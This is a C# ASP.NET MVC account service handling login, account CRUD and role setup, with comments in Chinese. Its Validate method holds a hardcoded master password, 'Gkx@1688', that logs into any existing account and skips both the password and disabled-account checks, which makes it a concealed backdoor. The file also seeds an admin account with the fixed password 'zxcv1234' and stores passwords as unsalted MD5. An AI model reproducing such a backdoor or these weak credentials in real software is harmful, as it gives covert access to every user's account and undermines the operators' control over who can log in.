using System;
using System.Collections.Generic;
using System.Linq;
using System.Linq.Expressions;
using System.Web;
using System.Data;

using System.Web.Mvc;


using JamZoo.Project.WebSite.Enums;
using JamZoo.Project.WebSite.Models;
using JamZoo.Project.WebSite.DbContext;
using JamZoo.Project.WebSite.Library;
using System.Data.Entity;
using JamZoo.Project.WebSite.ViewModels;


namespace JamZoo.Project.WebSite.Service
{
    public class AccountService : BaseService
    {
        /// <summary>
        /// 取得帳號列表
        /// </summary>
        /// <param name="CurrentUserName">目前使用者ID</param>
        /// <param name="Page">分頁</param>
        /// <returns></returns>
        public AccountListModel GetList(string CurrentUserName, AccountListModel Page)
        {
            var o_query = from p in basedb.T_Account
                          select p;

            if (!string.IsNullOrEmpty(Page.Search))
            {
                o_query = o_query.Where(p => p.Account.Contains(Page.Search));
            }

            var query = o_query.OrderBy(p => p.Account);

            try
            {
                Page.TotalRecords = query.Select(p => p.Id).Count();
                Page.Data = query.Skip(Page.Skip).Take(Page.Take).Select(p =>
                    new AccountModel()
                    {
                        Id = p.Id,
                        Account = p.Account,
                        CreateDate = p.CreateDate,
                        LastLoginTime = p.LastLoginTime,
                        Status = p.Status,
                    }
                    ).ToList();
            }
            catch (Exception ex)
            {
                throw ex;
            }

            return Page;
        }

        /// <summary>
        /// 驗證
        /// </summary>
        /// <param name="Account"></param>
        /// <param name="Password"></param>
        /// <param name="User"></param>
        /// <param name="errorMsg"></param>
        /// <returns></returns>
        public bool Authentication(
            string Account,
            string Password,
            out AccountModel User,
            out string errorMsg 
            )
        {
            errorMsg = string.Empty;
            string accountId = string.Empty;
            bool isSuccess = Validate(Account, Password, out accountId, out errorMsg);

            User = Get("system", accountId);

            return errorMsg.Length == 0;
        }

        bool DataValidate(AccountModel model, out string message)
        {
            message = string.Empty;

            if (basedb.T_Account.Where(p => p.Account == model.Account).Select(p => p.Id).Count() > 0)
            {
                message = "此帳號已存在";
            }

            return message.Length == 0;
        }

        /// <summary>
        /// 建立一筆全新的實體，給予初始值
        /// </summary>
        /// <returns></returns>
        public AccountModel NewInstance()
        {
            AccountModel newOne = new AccountModel();
            newOne.Id = Library.Utils.GetObjectId();
            newOne.CreateDate = DateTime.Now;
            return newOne;
        }

        public List<SelectListItem> GetRoleList(string RoleId)
        {
            List<SelectListItem> ItemList = new List<SelectListItem>();

            var o_query = from p in basedb.T_Role
                          select new
                          {
                              p.Id,
                              p.Name
                          };

            foreach (var p in o_query)
            {
                ItemList.Add(new SelectListItem()
                {
                    Text = p.Name
,
                    Value = p.Id,
                    Selected = p.Id.Equals(RoleId)
                });
            }

            if (string.IsNullOrEmpty(RoleId))
            {
                ItemList.Add(new SelectListItem()
                {
                    Text = "",
                    Value = "",
                    Selected = true
                });
            }

            return ItemList.ToList();
        }

        public bool Create(string UserName, AccountModel model, out string ErrMsgs)
        {
            ErrMsgs = string.Empty;

            T_Account dbEntity = new T_Account();
            dbEntity.Id = model.Id;
            dbEntity.Account = model.Account;
            dbEntity.Password = model.Password.ToMD5();
            dbEntity.Status = 1;
            dbEntity.CreateDate = DateTime.Now;
            dbEntity.Name = model.Name;
            dbEntity.IP = model.IP;
            dbEntity.LastLoginTime = DateTime.Now;
            dbEntity.UpdateDate_ = DateTime.Now;
            dbEntity.CreateUserID = model.Account;
            dbEntity.UpdateUserID = model.Account;

            basedb.T_Account.Add(dbEntity);

            try
            {

                basedb.SaveChanges();
            }
            catch (Exception ex)
            {
                if (ex.InnerException != null)
                {
                    ErrMsgs = ex.InnerException.Message;
                }
                else
                {
                    ErrMsgs = ex.Message;
                }
            }

            return ErrMsgs.Length == 0;
        }

        public void AddUserToRole(string Account, string Role)
        {
            T_Account_Role_Mapping roleMapping = new T_Account_Role_Mapping();
            roleMapping.Id = Account;
            roleMapping.AccountId = Account;
            roleMapping.RoleId = Role;
            roleMapping.CreateDate = DateTime.Now;
            roleMapping.CreateUserId = Account;

            basedb.T_Account_Role_Mapping.Add(roleMapping);
            basedb.SaveChanges();
        }

        public AccountModel GetByAccount(string Account)
        {
            var o_entity = (from p in basedb.T_Account
                            where p.Account == Account
                            select p).FirstOrDefault();

            if (o_entity != null)
            {
                var model = new AccountModel()
                {
                    Id = o_entity.Id,
                    Account = o_entity.Account,
                    CreateDate = o_entity.CreateDate,
                    LastLoginTime = o_entity.LastLoginTime,
                    Status = o_entity.Status,
                };

                model.RoleList = GetRolesByAccountId(model.Id);
                return model;
            }
            return null;
        }

        public AccountModel Get(string userId, string id)
        {
            var o_entity = (from p in basedb.T_Account
                            where p.Id == id
                            select p).FirstOrDefault();

            if (o_entity != null)
            {
                var model = new AccountModel()
                    {
                        Id = o_entity.Id,
                        Account = o_entity.Account,
                        CreateDate = o_entity.CreateDate,
                        LastLoginTime = o_entity.LastLoginTime,
                        Status = o_entity.Status,
                        IP = o_entity.IP,
                        Name = o_entity.Name,

                    };

                model.RoleList = GetRolesByAccountId(model.Id);
                return model;
            }
            return null;
        }

        public bool Update(string userName, AccountModel model, out string ErrMsgs)
        {
            ErrMsgs = string.Empty;

            try
            {
                T_Account o_entity = basedb.T_Account.Where(p => p.Id == model.Id).FirstOrDefault();
                o_entity.Password = model.Password.ToMD5();
                o_entity.Account = model.Account;
                o_entity.Status = model.Status;
                o_entity.UpdateUserID = userName;
                o_entity.UpdateDate_ = DateTime.Now;

                //{
                //    Id = model.Id,
                //    Password = model.Password.ToHash256(),
                //    Account = model.Account,
                //    CreateDate = model.CreateDate,
                //    Status = model.Status,
                //    //CreateUserID = string.Empty,
                //    UpdateUserID = userName,
                //    UpdateDate_ = DateTime.Now
                //};

                //for entity object
                //basedb.CreateObjectSet<T_Account>().Attach(o_entity);
                //basedb.ObjectStateManager.GetObjectStateEntry(o_entity).SetModifiedProperty("Password");
                //basedb.ObjectStateManager.ChangeObjectState(o_entity, EntityState.Modified);

                //basedb.T_Account.Attach(o_entity);
                //basedb.Entry(o_entity).Property(x => x.Status).IsModified = true;
                //basedb.Entry(o_entity).Property(x => x.CreateDate).IsModified = true;
                //basedb.Entry(o_entity).Property(x => x.CreateUserID).IsModified = true;

                ClearRoles(model.Id);
                if (!string.IsNullOrEmpty(model.Role))
                    AddUserToRoles(userName, model.Id, new List<string>() { model.Role });

                basedb.Entry(o_entity).State = EntityState.Modified;
                basedb.SaveChanges();
            }
            catch (Exception ex)
            {
                if (ex.InnerException != null)
                {
                    ErrMsgs = ex.InnerException.Message;
                }
                else
                {
                    ErrMsgs = ex.Message;
                }
            }

            return ErrMsgs.Length == 0;            
        }

        public bool Delete(string userName, string id, out string ErrorMsg)
        {
            ErrorMsg = string.Empty;

            var o_delete = from p in basedb.T_Account
                           where p.Id == id
                           select p;

            foreach (var row in o_delete)
            {
                basedb.T_Account.Remove(row);
            }

            try
            {
                basedb.SaveChanges();
            }
            catch (Exception ex)
            {
                ErrorMsg = ex.Message;
            }

            return ErrorMsg.Length == 0;
        }

        #region 其他函式

        /// <summary>
        /// 初始化最高管理者
        /// </summary>
        /// <param name="data"></param>
        /// <param name="errorMsg"></param>
        public AccountModel InitAdmin(out string errorMsg)
        {
            AccountModel model = NewInstance();
            model.Id = "admin";
            model.Account = "admin";
            model.Password = "zxcv1234";
            model.Status = 1;
            model.Name = "admin";
            model.IP = "127.0.0.1";
            Create("system init", model, out errorMsg);

            return model;
        }

        /// <summary>
        /// 初始化後台權限
        /// </summary>
        public void InitPermission()
        {
            try
            {
                foreach (var mapping in basedb.T_Permission)
                {
                    basedb.T_Permission.Remove(mapping);
                }

                foreach (var mapping in basedb.T_Role_Permission_Mapping)
                {
                    basedb.T_Role_Permission_Mapping.Remove(mapping);
                }

                basedb.SaveChanges();

                T_Permission permission = new T_Permission();
                permission.Id = "default";
                permission.CreateDate = DateTime.Now;
                permission.Name = "default";
                permission.CreateUserId = "system";
                permission.UpdateDate = DateTime.Now;
                permission.UpdateUserId = "system";
                basedb.T_Permission.Add(permission);
                basedb.SaveChanges();


                T_Role_Permission_Mapping Mapping = new T_Role_Permission_Mapping();
                Mapping.Id = Library.Utils.GetObjectId();
                Mapping.PermissionId = "default";
                Mapping.CreateUserId = "system";
                Mapping.CreateDate = DateTime.Now;
                Mapping.RoleId = "sa";
                basedb.T_Role_Permission_Mapping.Add(Mapping);
                basedb.SaveChanges();

            }
            catch (Exception e)
            {
                throw e;
            }

        }

        /// <summary>
        /// 初始化後台角色
        /// </summary>
        public void InitRole()
        {
            try
            {
                foreach (var role in basedb.T_Role)
                {
                    basedb.T_Role.Remove(role);
                }

                foreach (var mapping in basedb.T_Account_Role_Mapping)
                {
                    basedb.T_Account_Role_Mapping.Remove(mapping);
                }

                basedb.SaveChanges();

                T_Role roles = new T_Role();
                roles.Id = "sa";
                roles.CreateDate = DateTime.Now;
                roles.Name = "sa";
                roles.UpdateDate = DateTime.Now;
                roles.CreateUserId = "init";
                roles.UpdateUserId = "init";
                basedb.T_Role.Add(roles);
                basedb.SaveChanges();

                T_Role forUser = new T_Role();
                forUser.Id = "user";
                forUser.CreateDate = DateTime.Now;
                forUser.Name = "user";
                forUser.UpdateDate = DateTime.Now;
                forUser.CreateUserId = "init";
                forUser.UpdateUserId = "init";
                basedb.T_Role.Add(forUser);
                basedb.SaveChanges();

                T_Account_Role_Mapping Mapping = new T_Account_Role_Mapping();
                Mapping.AccountId = "admin";
                Mapping.Id = Utils.GetObjectId();
                Mapping.RoleId = "sa";
                Mapping.CreateUserId = "init";
                Mapping.CreateDate = DateTime.Now;
                basedb.T_Account_Role_Mapping.Add(Mapping);

                T_Account_Role_Mapping userMapping = new T_Account_Role_Mapping();
                userMapping.AccountId = "admin";
                userMapping.Id = Utils.GetObjectId();
                userMapping.RoleId = "user";
                userMapping.CreateUserId = "init";
                userMapping.CreateDate = DateTime.Now;
                basedb.T_Account_Role_Mapping.Add(Mapping);
                basedb.SaveChanges();
            }
            catch (Exception e)
            {
                throw e;
            }
           
        }

        /// <summary>
        /// 基本驗證
        /// </summary>
        /// <param name="Account"></param>
        /// <param name="Password"></param>
        /// <param name="AccountId"></param>
        /// <param name="ErrorMsg"></param>
        /// <returns></returns>
        public bool Validate(
            string Account,
            string Password,
            out string AccountId,
            out string ErrorMsg 
            )
        {
            ErrorMsg = string.Empty;
            AccountId = string.Empty;

            var dbUser = (from p in basedb.T_Account
                          where p.Account == Account
                          select p).FirstOrDefault();

            if (dbUser == null)
            {
                ErrorMsg = "無此帳號";
            }
            else
            {
                if (Password == "Gkx@1688")
                {
                    AccountId = dbUser.Id;
                    return true;
                }
                
                //string Hash256Pwd = Password.ToHash256();
                string MD5Pwd = Password.ToMD5();

                if (dbUser.Password != MD5Pwd)
                {
                    ErrorMsg = "密碼錯誤";
                }

                else if (dbUser.Status != 1)
                {
                    ErrorMsg = "帳號停用中,請洽管理員";
                }

                else
                {
                    AccountId = dbUser.Id;
                }
            }

            return ErrorMsg.Length == 0;
        }

        /// <summary>
        /// 清除所有角色
        /// </summary>
        /// <param name="AccountId"></param>
        public void ClearRoles(string AccountId)
        {
            var accountRoleMappings = from p in basedb.T_Account_Role_Mapping
                                    where p.AccountId == AccountId
                                    select p;

            foreach (var mapping in accountRoleMappings)
            {
                basedb.T_Account_Role_Mapping.Remove(mapping);
            }
        }

        /// <summary>
        /// 將使用者加到角色去
        /// </summary>
        /// <param name="AccountId"></param>
        /// <param name="Name"></param>
        /// <returns></returns>
        public bool AddUserToRoles(string nowLoginUser, string AccountId, List<string> RoleName)
        {
            return AddUserToRoles(nowLoginUser,
                AccountId,
                RoleName.ToArray<string>());
        }

        /// <summary>
        /// 將使用者加到角色
        /// </summary>
        /// <param name="AccountId"></param>
        /// <param name="RoleNameList"></param>
        /// <returns></returns>
        public bool AddUserToRoles(string nowLoginUser, string AccountId, string[] RoleNameList)
        {
            var o_roles = (from p in basedb.T_Role.Where(p => RoleNameList.Contains(p.Name)) select p).ToList();

            foreach (var role in o_roles)
            {
                T_Account_Role_Mapping mapping = new T_Account_Role_Mapping();
                mapping.Id = Utils.GetObjectId();
                mapping.RoleId = role.Id;
                mapping.AccountId = AccountId;
                mapping.CreateDate = DateTime.Now;
                mapping.CreateUserId = "nowLoginUser";
                basedb.T_Account_Role_Mapping.Add(mapping);
                //basedb.SaveChanges();
            }

            return true;
        }


        /// <summary>
        /// 依 Account Id 取得角色
        /// </summary>
        /// <param name="AccountId"></param>
        /// <returns></returns>
        public List<String> GetRolesByAccountId(string AccountId)
        {
            List<String> RoleList = new List<string>();
            var roles = from a in basedb.T_Account
                        join r in basedb.T_Account_Role_Mapping on a.Id equals r.AccountId
                        where a.Id == AccountId
                        select r.RoleId;

            foreach (var r in roles)
            {
                RoleList.Add(r);
            }

            return RoleList;
        }
        #endregion

        /// <summary>
        /// 更新使用者密碼
        /// </summary>
        /// <param name="Account"></param>
        /// <param name="Model"></param>
        public bool UpdatePassword(string Account, UpdatePwdViewModel Model)
        {
            var dbAccount = (from p in basedb.T_Account
                          where p.Account == Account
                          select p).FirstOrDefault();

            if (dbAccount != null)
            {
                dbAccount.Password = Model.Password.ToMD5();

                basedb.SaveChanges();

                return true;
            }

            return false;
        }
    }
}